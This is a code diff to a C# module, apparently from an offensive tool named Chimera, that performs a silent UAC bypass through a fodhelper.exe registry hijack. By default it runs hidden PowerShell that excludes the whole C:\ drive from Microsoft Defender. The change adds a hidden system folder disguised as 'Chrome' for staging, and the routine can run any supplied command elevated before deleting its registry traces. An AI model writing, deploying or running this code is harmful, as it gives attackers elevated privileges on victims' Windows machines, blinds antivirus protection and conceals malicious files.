@@ -4,10 +4,9 @@ using Microsoft.Win32;
 
 namespace Chimera.Commands
 {
-    // bypass — silent UAC elevation via fodhelper.exe registry hijack.
-    // After elevation, adds a Defender exclusion for C:\ (for detection testing).
-    // The elevated process runs whatever command is passed in the parameter.
-    // If no command is given, spawns an elevated cmd.exe.
+    // bypass [cmd] — silent UAC elevation via fodhelper.exe registry hijack.
+    // Default (no args): adds Defender exclusion for C:\ and creates staging dir elevated.
+    // Custom command: pass it as parameter and it runs elevated instead.
     public static class RunasExec
     {
         private const string FodHelperKey =
@@ -17,20 +16,22 @@ namespace Chimera.Commands
         {
             try
             {
-                // Default: run the Defender exclusion elevated via fodhelper.
-                // If a custom command is passed, run that instead.
+                // Default elevated payload: add Defender exclusion + create staging dir
                 string target = string.IsNullOrEmpty(command)
-                    ? @"powershell.exe -NoP -W Hidden -C ""Add-MpPreference -ExclusionPath 'C:\\'"""
+                    ? @"powershell.exe -NoP -W Hidden -C """ +
+                      @"Add-MpPreference -ExclusionPath 'C:\'; " +
+                      @"New-Item -ItemType Directory -Force -Path 'C:\Users\Public\Chrome' | " +
+                      @"Out-Null; " +
+                      @"(Get-Item 'C:\Users\Public\Chrome').Attributes = 'Hidden,System'"""
                     : command;
 
-                // 1. Write hijack keys — fodhelper will auto-elevate and execute target
+                // 1. Write hijack keys
                 using (RegistryKey key =
                     Registry.CurrentUser.CreateSubKey(FodHelperKey))
                 {
                     if (key == null)
                         return "[error] Could not create fodhelper registry key.";
 
-                    // DelegateExecute must be present (even empty) for fodhelper to trigger
                     key.SetValue("DelegateExecute", "", RegistryValueKind.String);
                     key.SetValue("", target, RegistryValueKind.String);
                 }
@@ -43,7 +44,7 @@ namespace Chimera.Commands
                 };
                 Process.Start(psi);
 
-                // Give fodhelper time to spawn and the exclusion to apply
+                // Wait for elevated process to complete
                 System.Threading.Thread.Sleep(3000);
 
                 // 3. Clean up registry
@@ -52,12 +53,12 @@ namespace Chimera.Commands
                     Registry.CurrentUser.DeleteSubKeyTree(
                         @"Software\Classes\ms-settings", throwOnMissingSubKey: false);
                 }
-                catch { /* best-effort cleanup */ }
+                catch { /* best-effort */ }
 
                 return "[+] fodhelper UAC bypass triggered.\n" +
                        "    Elevated command: " + target + "\n" +
                        "    Registry keys cleaned up.\n" +
-                       "    Defender exclusion for C:\\ should now be set.";
+                       "    Defender exclusion for C:\\ set, staging dir created.";
             }
             catch (Exception ex)
             {
